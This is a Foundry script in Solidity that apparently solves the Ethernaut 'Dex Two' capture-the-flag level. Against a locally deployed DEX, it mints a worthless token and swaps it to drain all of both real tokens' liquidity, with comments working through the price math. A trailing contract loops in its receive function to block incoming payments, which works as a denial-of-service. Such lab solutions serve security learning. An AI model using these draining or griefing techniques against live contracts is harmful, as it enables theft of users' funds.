// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {DexTwo, SwappableTokenTwo} from "../src/Dex2.sol";

contract Dex2Solution is Script {
    // $ forge script script/Dex2.s.sol --tc Dex2Solution -vvvv

    DexTwo dexInstance;
    SwappableTokenTwo token1;
    SwappableTokenTwo token2;

    function run() external {
        // Making the state to start the Challenge with
        dexInstance = new DexTwo();

        token1 = new SwappableTokenTwo(address(dexInstance), "Token1", "TK1", 110);
        token2 = new SwappableTokenTwo(address(dexInstance), "Token2", "TK2",110);

        dexInstance.setTokens(address(token1), address(token2));
        dexInstance.approve(address(dexInstance), 100);

        dexInstance.add_liquidity(address(token1), 100);
        dexInstance.add_liquidity(address(token2), 100);

        address swapper = makeAddr("swapper");
        vm.deal(swapper, 1 ether);

        token1.transfer(swapper, 10);
        token2.transfer(swapper, 10);

        // --- Attack will start --

        console.log("---> DEX State Draining liquidity <---");
        console.log("DEX token1 liquidity:", token1.balanceOf(address(dexInstance)));
        console.log("DEX token2 liquidity:", token2.balanceOf(address(dexInstance)));
        console.log("");

        // - The code is similar to the first one we made before (DEX), but the requirement is to drain both all liquidity from the protocol tokn1 and token2.
        // - Everything is the same, except for the swap function. it removes the check of the swappable tokens to be the exact tokens this pool represents. Which means we can swap any tokens we need in this case. Interesting!
        // - The DEX gets the price of assets from the balances of the DEX from the pair of tokens we will swap.
        // - So we can easily drain the liquidity without even needing token1 or token2 balance.
        // - 1. We will make a token ourselves (fakeToken)
        // - 2. Send funds to the DEX
        // - 3. Swap the fake token to the token1/token2
        // We need to take all liquidity, which means the returned value `swap` should be 100.
        // 100 = inputAmount * (DEX_token1/token2_balance) / Dex_fakeToken_balance
        // We can mint as many fake tokens as possible, it is our token. So by using some math, we can send an amount of fakeToken to the DEX. Then, we can calculate how much fakeToken input we should provide in `swap` to get all the liquidity.

        vm.startPrank(swapper);

        SwappableTokenTwo fakeToken = new SwappableTokenTwo(address(dexInstance), "Fake Token", "FAKE", 400);

        // Draining token1 liquidity
        // ----------------------------
        // DEX2 fakeToken balance = 100
        // DEX2 token1 balance    = 100
        // ---
        // Swap 100 fakeToken to get 100 token1
        // -- After Swapping --
        // DEX2 fakeToken balance = 200
        // DEX2 token1 balance    =   0
        fakeToken.transfer(address(dexInstance), 100);
        fakeToken.approve(address(dexInstance), 100);
        dexInstance.swap(address(fakeToken), address(token1), 100);

        console.log("---> DEX State After Making Draining token1 Liquidity <---");
        console.log("DEX token1 liquidity:", token1.balanceOf(address(dexInstance)));
        console.log("DEX token2 liquidity:", token2.balanceOf(address(dexInstance)));
        console.log("DEX fakeToken balance:", fakeToken.balanceOf(address(dexInstance)));
        console.log("");

        // Draining token2 liquidity
        // ----------------------------
        // DEX2 fakeToken balance = 200
        // DEX2 token2 balance    = 100
        // ---
        // Swap 200 fakeToken to get 100 token2
        // out = (In * to) / from
        // out = (amountIn * DEX_token2_balance) / DEX_fakeToken_balance
        // out =  (amountIn * 100) / 200
        // We need to get all the liquidity from the DEX which equals 100, therfore
        // 100 = (amountIn * 100) / 200
        // amountIn = 200 #
        // -- After Swapping --
        // DEX2 fakeToken balance = 200
        // DEX2 token1 balance    =   0

        fakeToken.approve(address(dexInstance), 200);
        dexInstance.swap(address(fakeToken), address(token2), 200);

        console.log("---> DEX State After Making Draining token2 Liquidity <---");
        console.log("DEX token1 liquidity:", token1.balanceOf(address(dexInstance)));
        console.log("DEX token2 liquidity:", token2.balanceOf(address(dexInstance)));
        console.log("DEX fakeToken balance:", fakeToken.balanceOf(address(dexInstance)));
    }

    function getInFromOut(uint256 fromBalance, uint256 toBalance, uint256 amount) internal pure returns (uint256) {
        return amount * fromBalance / toBalance;
    }
}

contract DenialAttack {
    receive() external payable {
        for (uint256 i = 0; i < 1_000_000; i++) {}
    }
}
